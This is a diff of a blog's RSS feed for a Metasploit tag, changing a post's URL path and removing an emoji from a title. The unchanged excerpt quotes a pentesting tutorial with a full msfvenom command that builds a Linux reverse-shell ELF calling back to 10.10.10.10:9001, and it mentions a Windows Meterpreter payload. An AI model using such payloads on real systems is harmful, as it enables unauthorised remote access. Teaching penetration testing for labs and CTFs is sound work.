@@ -10,9 +10,9 @@
     <atom:link href="http://localhost:1313/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Generating Reverse Shells with Metasploit&#39;s msfvenom.</title>
-      <link>http://localhost:1313/posts/tipsandtricks/webvulnerability/metasploit_meterpreter_reverseshell/</link>
+      <link>http://localhost:1313/posts/penetration-testing/webvulnerability/metasploit_meterpreter_reverseshell/</link>
       <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/posts/tipsandtricks/webvulnerability/metasploit_meterpreter_reverseshell/</guid>
+      <guid>http://localhost:1313/posts/penetration-testing/webvulnerability/metasploit_meterpreter_reverseshell/</guid>
       <description>&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Always remember to use the same payload in &lt;code&gt;msfconsole&lt;/code&gt; as you used to generate in &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
 &lt;h3 id=&#34;linux-reverse-shell-extension-doesnt-matter-for-linux&#34;&gt;Linux Reverse Shell (extension doesn&amp;rsquo;t matter for Linux)&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p linux/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.10.10 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9001&lt;/span&gt; -f elf -o shell.elf
@@ -24,7 +24,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Payload Type:&lt;/strong&gt; Windows x64 Meterpreter Reverse TCP &lt;strong&gt;Suitable for:&lt;/strong&gt; 64-bit Windows systems, spawns a Meterpreter session.&lt;/p&gt;</description>
     </item>
     <item>
-      <title>🧨 Metasploit Practical Guide (for Beginners and CTF use)</title>
+      <title>Metasploit Practical Guide (for Beginners and CTF use)</title>
       <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/</link>
       <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
       <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/</guid>
